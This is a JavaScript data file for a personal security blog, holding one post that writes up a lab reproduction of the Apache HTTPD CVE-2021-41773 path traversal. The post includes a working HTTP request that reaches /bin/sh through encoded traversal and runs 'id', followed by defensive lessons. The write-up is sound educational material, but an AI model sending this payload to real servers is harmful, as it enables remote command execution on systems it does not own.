// =================================================================
// NAYA POST ADD KARNE KE LIYE, IS ARRAY MEIN EK NAYA OBJECT ADD KAREIN
// =================================================================
// 'title', 'date', 'excerpt', aur 'content' zaroori hain.
// 'content' mein aap HTML tags (jaise <p>, <h3>, <code>) use kar sakte hain.

const postsData = [
    {
        title: "CVE-2021-41773: Apache HTTPD Path Traversal Exploit",
        date: "August 06, 2025",
        excerpt: "This triggered shell execution and confirmed the server was vulnerable. One line. One hit. Shell pop.",
        content: `
            <p><strong>Discovered in October 2021</strong>, <code>CVE-2021-41773</code> is a directory traversal vulnerability in Apache HTTP Server version 2.4.49. It allows attackers to map URLs to files outside the intended document root using crafted path traversal sequences like <code>../</code>.</p>
            <p>This vulnerability becomes critical when combined with misconfigured <code>mod_cgi</code>, allowing attackers to execute arbitrary commands on the server — turning a simple LFI into full-blown RCE.</p>
            <h2>🔍 My Approach</h2>
            <p>I replicated the vulnerability in a lab with Apache 2.4.49 running on Ubuntu. No WAF. CGI enabled. A perfect storm.</p>
            <p>Request used:</p>
            <pre><code>GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: vulnerable.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

echo; id
</code></pre>
            <p>This triggered shell execution and confirmed the server was vulnerable. One line. One hit. Shell pop.</p>
            <h2>📌 Key Lessons</h2>
            <ul>
                <li>Never expose <code>mod_cgi</code> publicly unless it's sandboxed or containerized.</li>
                <li>Always validate patch versions — admins often update partially.</li>
                <li>Don't underestimate LFI — they often become RCE in creative hands.</li>
            </ul>
            <h2>💬 Final Thoughts</h2>
            <p>This CVE is a classic reminder: <strong>simple misconfigurations lead to critical impact</strong>. My goal with testing such exploits isn't just execution — it’s education. Security isn’t about paranoia — it’s about precision.</p>
            <p class="signature">~ OffsecKalki</p>
        `
    }
    // NAYA POST YAHAN ADD KAREIN. Example:
    /*
    {
        title: "New Post Title",
        date: "August 10, 2025",
        excerpt: "This is the summary of my new amazing blog post.",
        content: "<p>Full content of the new post goes here.</p>"
    },
    */
];
